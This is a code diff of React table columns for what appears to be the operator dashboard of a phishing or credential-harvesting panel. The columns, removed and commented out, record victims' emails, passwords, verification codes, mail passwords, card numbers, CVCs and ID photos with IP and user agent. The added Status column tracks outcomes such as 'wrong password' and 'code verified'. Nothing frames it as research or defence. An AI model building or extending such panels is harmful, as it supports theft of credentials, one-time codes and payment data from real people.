@@ -32,129 +32,46 @@ export const collectionColumn = [
     width: "auto",
   },
   {
-    Header: "email",
-    accessor: "email",
+    Header: "Amount",
+    accessor: "amount",
     width: "auto",
+    Cell: ({ value }) => {
+      if (!value) return <span className="text-gray-400">-</span>;
+      const parsed = parseFloat(value);
+      return (
+        <span className="font-bold text-emerald-600">
+          {!isNaN(parsed) ? `$${parsed.toFixed(2)}` : value}
+        </span>
+      );
+    }
   },
   {
-    Header: "password",
-    accessor: "password",
+    Header: "Status",
+    accessor: "status",
     width: "auto",
-    // minWidth: 150,
+    Cell: ({ value }) => {
+      const statusVal = value || "pending";
+      let bg = "bg-yellow-100 text-yellow-800 border border-yellow-200";
+      if (statusVal === "successful" || statusVal === "success") {
+        bg = "bg-green-100 text-green-800 border border-green-200";
+      } else if (statusVal === "wrong password" || statusVal === "pass-wrong") {
+        bg = "bg-red-100 text-red-800 border border-red-200";
+      } else if (statusVal === "code verified" || statusVal === "code-verify") {
+        bg = "bg-blue-100 text-blue-800 border border-blue-200";
+      }
+      return (
+        <span className={`px-2 py-0.5 rounded-full text-xs font-semibold uppercase tracking-wider ${bg}`}>
+          {statusVal}
+        </span>
+      );
+    }
   },
-  // {
-  //   Header: "Wrong Password",
-  //   accessor: "wrongPassword",
-  //   width: "auto",
-  //   minWidth: 200,
-  // },
-  {
-    Header: "GCode",
-    accessor: "gCode",
-    width: "auto",
-  },
-  {
-    Header: "Code",
-    accessor: "skipcode",
-    width: "auto",
-  },
-  // {
-  //   Header: "Validity",
-  //   accessor: "validity",
-  //   width: "auto",
-  // },
-  // {
-  //   Header: "Address",
-  //   accessor: "address",
-  //   width: "auto",
-  // },
-  // {
-  //   Header: "Card Number",
-  //   accessor: "cardNumber",
-  //   width: "auto",
-  // },
-  // {
-  //   Header: "CVC",
-  //   accessor: "cvc",
-  //   width: "auto",
-  // },
-  // {
-  //   Header: "Card Holder Name",
-  //   accessor: "name",
-  //   width: "auto",
-  // },
-  // {
-  //   Header: "Zip Code",
-  //   accessor: "zipCode",
-  //   width: "auto",
-  // },
-  {
-    Header: "Mail",
-    accessor: "mail",
-    width: "auto",
-    // minWidth: 100,
-  },
-  // {
-  //   Header: "mail Password",
-  //   accessor: "mailPass",
-  //   width: "auto",
-  //   minWidth: 160,
-  // },
-  // {
-  //   Header: "Username",
-  //   accessor: "username",
-  //   width: "auto",
-  //   // minWidth: 150,
-  // },
-  {
-    Header: "Passcode",
-    accessor: "passcode",
-    width: "auto",
-    // minWidth: 150,
-  },
-
-  // {
-  //   Header: "Only Card",
-  //   accessor: "onlyCard",
-  //   disableSortBy: true,
-  //   width: "auto",
-  //   // minWidth: 150,
-  //   Cell: ({ row }) => (
-  //     <div className="flex justify-center items-center">
-  //       {row.original.onlyCard && (
-  //         <Link href={row.original.onlyCard} target="_blank">
-  //           <p className="text-sm text-blue-500 hover:text-blue-700 transition-colors duration-200">
-  //             View Image
-  //           </p>
-  //         </Link>
-  //       )}
-  //     </div>
-  //   ),
-  // },
-  // {
-  //   Header: "Holding Card",
-  //   accessor: "holdingCard",
-  //   disableSortBy: true,
-  //   // width: 200,
-  //   // minWidth: 150,
-  //   width: "auto",
-  //   Cell: ({ row }) => (
-  //     <div className="flex justify-center items-center">
-  //       {row.original.holdingCard && (
-  //         <Link href={row.original.holdingCard} target="_blank">
-  //           <p className="text-sm text-blue-500 hover:text-blue-700 transition-colors duration-200">
-  //             View Image
-  //           </p>
-  //         </Link>
-  //       )}
-  //     </div>
-  //   ),
-  // },
   {
     Header: "Ip",
     accessor: "ip",
     width: "auto",
   },
+
   {
     Header: "Agent",
     accessor: "agent",
@@ -173,21 +90,6 @@ export const collectionColumn = [
       </div>
     ),
   },
-  // {
-  //   Header: "verify_code",
-  //   accessor: "verify_code",
-  // },
-  // {
-  //   Header: "date_time",
-  //   accessor: "date_time",
-  // },
-  // {
-  //   Header: "date_time",
-  //   accessor: "date_time",
-  //   Cell: ({ value }) => {
-  //     return format(new Date(value), "dd/MM/yyyy");
-  //   },
-  // },
   {
     Header: "Option",
     accessor: "_id",
